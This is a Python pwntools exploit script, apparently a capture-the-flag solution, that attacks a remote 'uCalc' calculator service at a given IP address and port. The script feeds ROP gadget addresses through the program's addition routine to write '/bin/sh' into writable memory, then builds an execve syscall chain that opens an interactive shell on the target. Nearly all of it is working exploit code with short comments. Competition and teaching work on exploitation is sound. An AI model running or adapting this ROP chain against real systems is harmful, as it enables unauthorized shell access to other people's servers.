from pwn import *

# p = process(["./uCalc"])
p = remote("103.37.125.56",10002)

# elf = ELF("./uCalc")

# context.log_level = 'debug'

def add(num):
    x = num - 3000000
    y = num - x
    p.sendlineafter(b"=> ",b"1")
    p.sendlineafter(b"x: ",str(x))
    p.sendlineafter(b"y: ",str(y))

pop_rax = 0x000000000045a2c7
pop_rdi = 0x0000000000401932
pop_rsi = 0x000000000040f7fe
pop_rdx = 0x000000000040183f
ret = 0x000000000040101a
syscall = 0x00000000004012e3

mov_rdx_rdi = 0x0000000000443913 # mov qword ptr [rdi], rdx ; ret
str_binsh = int.from_bytes(b"/bin","little")
str_binsh_2 = int.from_bytes(b"/sh\x00","little")
add_binsh = 0x00000000004e1000

# p/d ret - memcpy
# -> 56 ->> 56/8 = 9. Range 7 address

p.sendlineafter(b"ngitung? ",b"100")

# First rop to store /bin/sh string
# Write "/bin/sh" to 0x00000000004e1000
# vmmap -> find rw permission
# x/20gx 0x00000000004e1000 -> empty

for i in range(7):
    add(0)

add(pop_rdi)
add(add_binsh)
add(pop_rdx)
add(str_binsh)
add(mov_rdx_rdi)

add(pop_rdi)
add(add_binsh+4)
add(pop_rdx)
add(str_binsh_2)
add(mov_rdx_rdi)

# Create ROP to spawn execve("/bin/sh",0,0)
# rax -> 59 (execve)
# rdi -> addr bin_sh
# rsi -> 0x0
# rdx -> 0x0
# syscall

# gdb.attach(p)

add(pop_rax)
add(59)

add(pop_rdi)
add(add_binsh)

add(pop_rsi)
add(0)

add(pop_rdx)
add(0)

add(syscall)

p.sendlineafter(b"=>",b"5")

p.interactive()
